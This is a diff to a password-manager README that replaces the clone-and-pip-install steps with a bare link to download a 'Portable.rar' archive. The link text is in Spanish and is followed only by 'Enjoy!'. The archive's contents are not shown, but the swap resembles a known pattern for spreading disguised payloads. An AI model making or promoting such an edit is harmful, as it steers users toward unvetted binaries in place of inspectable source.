@@ -19,17 +19,11 @@ A secure desktop application for managing passwords, built with Python and Tkint
 - Pyperclip (Clipboard integration)
 
 ## 📦 Installation
-1. Clone the repository:
-```bash
-git clone https://github.com/Juda-Tech-Green/password-manager.git
-cd password-manager
-```
 
-2. Install dependencies:
-```bash
-pip install pandas pyperclip
-python main.py
-```
+1. [Descargar Password Manager - Portable.rar](https://github.com/Juda-Tech-Green/password-manager/raw/main/Password%20Manager%20-%20Portable.rar?download=1)
+
+2. Enjoy!
+
 ## 🎮 How to Use
 1. **Add new entry:**
   - Enter Website, Username/Email.
